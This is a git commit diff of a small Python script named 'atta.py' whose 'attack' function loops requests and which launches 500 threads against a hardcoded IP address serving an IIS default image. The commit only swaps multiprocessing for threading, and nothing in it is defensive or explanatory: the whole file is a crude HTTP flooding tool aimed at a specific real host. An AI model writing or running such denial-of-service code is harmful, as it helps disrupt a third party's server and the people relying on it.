38db34efc1fc7cb525ae4fe2e6915552f1c7d4ac
rootmelo92118 <32770959+rootmelo92118@users.noreply.github.com>
2024-01-11 01:45:50 +0800

    Update atta.py

--- atta.py
+++ atta.py
@@ -1,14 +1,14 @@
 from urllib.request import urlopen
-import multiprocessing, requests
+import threading, requests
 
-def attack(url, num):
-    print("process "+str(num)+" is on.")
+def attack(url):
     while True:
         requests.get(url)
         urlopen(url)
-    print("process "+str(num)+" is off.")
         
         
 for i in range(0,500):
-    multiprocessing.Process(target=urlopen, args=("http://180.176.210.28/iisstart.png",i,)).start()
-  
+    threading.Thread(target=urlopen, args=("http://180.176.210.28/iisstart.png",)).start()
+    
+    
+    
